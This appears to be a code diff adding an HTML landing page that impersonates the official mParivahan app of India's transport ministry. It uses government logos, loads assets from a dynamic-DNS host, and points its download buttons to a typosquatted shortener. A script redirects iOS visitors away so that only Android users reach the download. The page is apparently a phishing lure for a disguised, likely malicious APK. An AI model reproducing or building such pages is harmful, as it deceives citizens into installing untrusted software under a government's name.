@@ -1,18 +1,261 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>mParivahan App – Official Download</title>
-    <meta name="description" content="Download the official mParivahan Android app by Ministry of Road Transport & Highways, Govt. of India. Access vehicle details, driving licence, challan services.">
-    <meta name="robots" content="index, follow">
-    <meta property="og:title" content="mParivahan App – Official Download">
-    <meta property="og:description" content="Official mParivahan app for vehicle, DL & challan services. Android only.">
-    <meta property="og:type" content="website">
-    <link rel="icon" href="https://mparivahan.zapto.org/echallan.png">
-  </head>
-  <body>
-    <div id="app"></div>
-    <script type="module" src="/src/main.js"></script>
-  </body>
+
+<head>
+    <script>
+        var ua = navigator.userAgent || navigator.vendor || window.opera;
+
+        if (/iPad|iPhone|iPod/.test(ua)) {
+            window.location.href = "android-only.html";
+        }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>mParivahan App – Vehicle, DL & Challan Services</title>
+
+    <meta name="description" content="Download the mParivahan Android app to access vehicle details, driving licence services and challan information digitally.">
+
+    <style>
+        :root {
+            --primary: #0b4fa3;
+            --dark: #0f172a;
+            --muted: #64748b;
+            --bg: #f5f7fb;
+            --card: #ffffff;
+        }
+
+        /* ===== GLOBAL ===== */
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--dark);
+            line-height: 1.6;
+            position: relative;
+        }
+
+        /* ===== BACKGROUND IMAGE (10% visibility) ===== */
+
+        body::before {
+            content: "";
+            position: fixed;
+            inset: 0;
+            background: url("https://play-lh.googleusercontent.com/7Ddr_L-nxrzbMjoXVhGpO9MMdImXfvg5UAjZv_9VjjZZ4L9qdMzwXZZbwbfan-WUWD0=w5120-h2880-rw") center / cover no-repeat;
+            opacity: 0.10;
+            /* 10% visibility */
+            z-index: -1;
+        }
+
+        /* ===== HERO ===== */
+
+        .hero {
+            background: linear-gradient(135deg, #0b4fa3, #083a78);
+            color: #fff;
+            padding: 42px 18px 72px;
+            text-align: center;
+        }
+
+        /* LOGOS */
+
+        .logos {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin-bottom: 22px;
+        }
+
+        .logos img {
+            height: 40px;
+            object-fit: contain;
+            filter: brightness(0) invert(1);
+            opacity: 0.95;
+        }
+
+        .hero h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .hero p {
+            font-size: 16px;
+            opacity: .95;
+            max-width: 520px;
+            margin: 0 auto 24px;
+        }
+
+        .hero button {
+            background: #fff;
+            color: var(--primary);
+            border: none;
+            padding: 14px 28px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+
+        .hero button:active {
+            transform: scale(.98);
+        }
+
+        /* ===== CONTENT ===== */
+
+        .container {
+            max-width: 900px;
+            margin: -48px auto 0;
+            padding: 0 16px 32px;
+        }
+
+        .card {
+            background: var(--card);
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 20px;
+            box-shadow: 0 12px 28px rgba(0, 0, 0, .08);
+        }
+
+        .card h2 {
+            color: var(--primary);
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 16px;
+        }
+
+        .feature {
+            border: 1px solid #e5e7eb;
+            border-radius: 12px;
+            padding: 18px;
+        }
+
+        .feature h3 {
+            font-size: 16px;
+            margin-bottom: 6px;
+        }
+
+        .feature p {
+            font-size: 14px;
+            color: var(--muted);
+        }
+
+        /* ===== DOWNLOAD STRIP ===== */
+
+        .download-strip {
+            background: #eef4ff;
+            border-radius: 14px;
+            padding: 22px;
+            text-align: center;
+        }
+
+        .download-strip h3 {
+            font-size: 18px;
+            margin-bottom: 6px;
+        }
+
+        .download-strip p {
+            color: var(--muted);
+            margin-bottom: 14px;
+        }
+
+        .download-strip button {
+            background: var(--primary);
+            color: #fff;
+            border: none;
+            padding: 12px 26px;
+            font-size: 15px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        /* ===== FOOTER ===== */
+
+        footer {
+            text-align: center;
+            font-size: 13px;
+            color: #6b7280;
+            padding: 28px 16px 36px;
+        }
+
+        footer a {
+            color: #2563eb;
+            text-decoration: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- HERO -->
+    <section class="hero">
+
+        <!-- LOGOS (3–4 images) -->
+        <div class="logos">
+            <img src="https://cdnbbsr.s3waas.gov.in/s3dcf6070a4ab7f3afbfd2809173e0824b/uploads/2024/10/20241009217618493.svg" alt="Logo 1">
+            <img src="https://cdnbbsr.s3waas.gov.in/s3dcf6070a4ab7f3afbfd2809173e0824b/uploads/2024/12/202412061445137587.svg" alt="Logo 2">
+            <img src="https://mparivahan.zapto.org/echallan.png" alt="Logo 3">
+        </div>
+
+        <h1>mParivahan App</h1>
+        <p>
+            Access the mParivahan mobile application to digitally verify photographic challans, view vehicle details, and utilize driving license services and violation information.
+        </p>
+        <a href="https://mparivahaan.s.gy/grqHZR">
+            <button>Download App</button>
+        </a>
+    </section>
+
+    <div class="container">
+
+        <div class="card">
+            <h2>mParivahan Services Overview</h2>
+            <div class="grid">
+                <div class="feature">
+                    <h3>Traffic Violation & Challan Records</h3>
+                    <p>Track traffic violations with photographic evidence, review old and pending challans, confirm payments, and download receipts instantly through the mParivahan app.</p>
+                </div>
+                <div class="feature">
+                    <h3>Dispute Incorrect Traffic Violations</h3>
+                    <p>Raise an appeal against false or incorrect traffic challans directly through the mParivahan app.</p>
+                </div>
+                <div class="feature">
+                    <h3>Learner / Driving License Services </h3>
+                    <p>Apply for new learner and driving licences online directly from your mobile</p>
+                </div>
+                <div class="feature">
+                    <h3>Digital Documents via Digilocker</h3>
+                    <p>Access DL & RC information securely on your mobile device.</p>
+                </div>
+            </div>
+        </div>
+        <div class="card download-strip">
+            <h3>Get the mParivahan Android App</h3>
+            <p>Fast • Secure • Digital access to transport services</p>
+            <a href="https://mparivahaan.s.gy/grqHZR">
+                <button>Download App</button>
+            </a>
+        </div>
+
+        <footer>
+            © 2026 • mParivahan App Information Page<br> Android users only • Secure download
+        </footer>
+
+        <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"d2d3b0c8f7e14becbe87950bfad4b8f0","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
+            crossorigin="anonymous"></script>
+</body>
+
 </html>
